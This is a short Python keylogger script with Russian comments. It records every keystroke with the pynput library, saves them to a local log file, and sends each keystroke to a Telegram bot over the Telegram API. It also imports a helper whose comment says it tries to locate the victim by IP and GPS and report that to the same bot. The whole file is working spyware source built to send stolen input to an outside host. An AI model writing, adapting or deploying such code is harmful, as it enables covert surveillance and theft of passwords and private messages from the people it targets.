# keylogger using pynput module
import pynput
from pynput.keyboard import Key, Listener
import telebot
import requests
from test import probiv_ip_gps #попытка пробива пользователя и скинуть его в тотже тг бот


TOKEN = "" #vvodim token from botfather
chat_id = "" #информацию получает конкретный пользователь с уникальным chat_id
mes = probiv_ip_gps() #наш ip, gps
bot = telebot.TeleBot(TOKEN)


keys = []


@bot.message_handler(commands=['ip'])
def start_message(m):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={mes}"
    requests.get(url).json() #отсылаем сообщение
bot.infinity_polling()


def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        #print('alphanumeric key {0} pressed'.format(key.char))
        message = 'alphanumeric key {0} pressed'.format(key.char)
    except AttributeError:
        #print('special key {0} pressed'.format(key))
        message = 'special key {0} pressed'.format(key)
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
    print(requests.get(url).json())  #отсылаем сообщение

def write_file(keys):

    with open('log.txt', 'w') as f:
        for key in keys:
            #удаление ''
            k = str(key).replace("'", "")
            f.write(k)
            #добавляем пробел
            f.write(' ')


def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        #Конец
        return False


with Listener(on_press=on_press,
              on_release=on_release) as listener:
    listener.join()
